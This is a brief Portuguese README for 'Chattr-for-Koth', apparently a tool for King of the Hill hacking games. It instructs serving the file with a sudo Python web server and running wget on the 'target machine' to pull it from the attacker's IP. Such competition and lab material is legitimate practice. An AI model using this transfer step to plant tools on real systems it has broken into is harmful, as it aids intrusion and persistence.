# Chattr-for-Koth
Chattr para Koth

instale o repositório para sua máquina :)

# Como usar:

Você vai precisar abrir um Webserver em python usando:
```sudo python3 -m http.server```


Depois você usa na máquina alvo:
```wget http://<your ip>:<port>/Chattr-for-Koth-file```
